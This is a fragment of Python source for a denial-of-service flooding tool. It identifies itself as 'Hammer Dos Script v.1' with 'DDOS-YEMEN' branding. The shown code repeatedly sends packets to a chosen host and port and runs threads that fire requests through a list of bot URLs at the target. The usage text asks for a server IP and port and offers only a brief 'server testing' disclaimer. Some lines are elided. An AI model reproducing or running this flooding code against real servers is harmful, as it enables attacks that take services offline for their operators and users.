	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[1;35m",time.ctime(time.time()),"\033[0m \033[1;32m <--packet sent! DDOS-YEMEN--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[1;31mSTOP<=>down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[1;36m There is no service\033[0m")
...
def dos2():
	while True:
		item=w.get()
		bot_DDOS_YEMEN(random.choice(bots)+"http://"+host)
		w.task_done()


def usage():
	print (''' \033[1;35m	Hammer Dos Script v.1 http://www.canyalcin.com/
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	USE==>  python3 Akram.py
	-h : help
	-s : server ip
	-p : port default 80
